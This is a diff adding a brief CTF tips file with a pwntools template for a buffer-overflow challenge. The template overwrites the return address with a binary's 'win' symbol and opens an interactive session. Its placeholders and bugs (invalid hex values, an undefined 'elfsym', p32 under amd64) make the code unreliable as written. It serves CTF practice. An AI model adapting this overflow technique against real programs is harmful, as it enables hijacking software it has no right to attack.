@@ -1,0 +1,24 @@
+Just a list of tips to help when tackling problems!
+
+Basic code snippit below, copy and paste as needed
+from pwn import *
+
+p = process ("./chall_##")
+
+context.arch = "amd64" #if 64 bit calling convention, this will save you a headache
+
+p.recv()
+payload = b''
+payload+= (0xABCDE - 0xEFG + 0xBFR) * b'A' #figure out where you have to go, do the math in parenthesis!
+elf = ELF("./chall_##") #used to call the methods in system, other ways to do involve getting the addr, this works too
+payload += p32(elfsym.win)
+
+#make sure you send however many lines your input is expecting -1
+p.sendline("andyrulz")
+
+#now, send your final line including the payload.
+p.sendline(payload)
+
+p.interactive()
+ls
+
